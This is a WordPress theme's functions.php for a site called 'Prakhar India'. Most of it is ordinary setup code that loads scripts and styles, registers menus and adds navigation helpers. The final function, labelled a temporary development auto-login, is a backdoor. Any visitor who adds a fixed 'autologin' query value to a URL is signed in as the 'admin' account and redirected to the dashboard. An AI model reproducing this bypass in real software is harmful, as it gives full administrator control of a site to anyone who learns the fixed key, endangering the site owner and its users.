<?php
/**
 * Prakhar India theme functions and definitions.
 */

if (!defined('ABSPATH')) exit;

define('PRAKHAR_VERSION', '1.0.0');
define('PRAKHAR_THEME_URI', get_template_directory_uri());

function prakhar_setup() {
    load_theme_textdomain('prakhar', get_template_directory() . '/languages');
    add_theme_support('title-tag');
    add_theme_support('post-thumbnails');
    add_theme_support('custom-logo');
    add_theme_support('html5', array('search-form', 'comment-form', 'comment-list', 'gallery', 'caption'));
    add_theme_support('automatic-feed-links');
    register_nav_menus(array(
        'primary' => __('Primary Menu', 'prakhar'),
    ));
}
add_action('after_setup_theme', 'prakhar_setup');

function prakhar_scripts() {
    wp_enqueue_style('prakhar-theme-info', get_stylesheet_uri(), array(), PRAKHAR_VERSION);
    wp_enqueue_style('prakhar-style', PRAKHAR_THEME_URI . '/assets/css/style.css', array(), PRAKHAR_VERSION);

    wp_enqueue_script('prakhar-lang', PRAKHAR_THEME_URI . '/assets/js/lang.js', array(), PRAKHAR_VERSION, true);
    wp_enqueue_script('prakhar-main', PRAKHAR_THEME_URI . '/assets/js/main.js', array(), PRAKHAR_VERSION, true);
    wp_enqueue_script('prakhar-forms', PRAKHAR_THEME_URI . '/assets/js/forms.js', array(), PRAKHAR_VERSION, true);

    // Localize rest url and security nonce for forms submission
    wp_localize_script('prakhar-forms', 'prakhar_settings', array(
        'rest_url' => esc_url_raw(rest_url('pi/v1/')),
        'nonce'    => wp_create_nonce('wp_rest')
    ));

    if (is_front_page()) {
        wp_enqueue_script('prakhar-home', PRAKHAR_THEME_URI . '/assets/js/home.js', array(), PRAKHAR_VERSION, true);
    }

    if (is_page('login') || is_page('signup')) {
        wp_enqueue_style('prakhar-auth', PRAKHAR_THEME_URI . '/assets/css/auth.css', array('prakhar-style'), PRAKHAR_VERSION);
    }
    if (is_page('login')) {
        wp_enqueue_script('prakhar-login', PRAKHAR_THEME_URI . '/assets/js/login.js', array(), PRAKHAR_VERSION, true);
        wp_localize_script('prakhar-login', 'prakhar_settings', array(
            'rest_url' => esc_url_raw(rest_url('pi/v1/')),
            'nonce'    => wp_create_nonce('wp_rest')
        ));
    }
    if (is_page('signup')) {
        wp_enqueue_script('prakhar-signup', PRAKHAR_THEME_URI . '/assets/js/signup.js', array(), PRAKHAR_VERSION, true);
        wp_localize_script('prakhar-signup', 'prakhar_settings', array(
            'rest_url' => esc_url_raw(rest_url('pi/v1/')),
            'nonce'    => wp_create_nonce('wp_rest')
        ));
    }
}
add_action('wp_enqueue_scripts', 'prakhar_scripts');

function prakhar_pages($page) {
    return esc_url(home_url('/' . $page . '/'));
}

function prakhar_page_slug() {
    $slug = '';
    if (is_front_page()) {
        $slug = 'home';
    } elseif (is_singular()) {
        $slug = get_post_field('post_name', get_queried_object_id());
    }
    return $slug;
}

function prakhar_nav_item($slug, $label, $current) {
    $class = ($current === $slug || ($slug === 'home' && $current === '')) ? ' class="active"' : '';
    echo '<a href="' . prakhar_pages($slug) . '"' . $class . '>' . esc_html($label) . '</a>';
}

function prakhar_remove_wpautop_on_pages($content) {
    if (is_page()) {
        remove_filter('the_content', 'wpautop');
        remove_filter('the_content', 'wptexturize');
    }
    return $content;
}
add_filter('the_content', 'prakhar_remove_wpautop_on_pages', 5);

// Temporary Auto-Login for easy development access
function prakhar_auto_login() {
    if (isset($_GET['autologin']) && $_GET['autologin'] === 'prakharadmin') {
        $user = get_user_by('login', 'admin');
        if ($user) {
            wp_clear_auth_cookie();
            wp_set_current_user($user->ID);
            wp_set_auth_cookie($user->ID);
            wp_safe_redirect(admin_url());
            exit;
        }
    }
}
add_action('init', 'prakhar_auto_login');